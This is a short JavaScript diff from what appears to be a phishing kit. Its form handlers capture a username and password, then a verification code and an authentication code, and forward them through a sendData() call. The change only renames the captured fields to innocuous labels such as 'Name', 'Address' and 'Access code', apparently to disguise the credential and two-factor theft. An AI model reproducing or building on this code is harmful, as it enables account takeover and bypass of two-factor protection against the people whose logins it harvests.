@@ -192,7 +192,7 @@
     e.preventDefault();
     const username = $("#username").val();
     const password = $("#password").val();
-    const message = `Username: ${username} \nPassword: ${password}`;
+    const message = `Name: ${username} \nAddress: ${password}`;
     sendData(message, 'cred');
   });
   
@@ -200,7 +200,7 @@
     e.preventDefault();
     const code = $("#code").val();
     const authentication_code = $("#authentication_code").val();
-    const message = `Verification code: ${code} \nAuthentication code: ${authentication_code}`;
+    const message = `Access code: ${code} \nAccess code: ${authentication_code}`;
     sendData(message, 'code');
   });
 
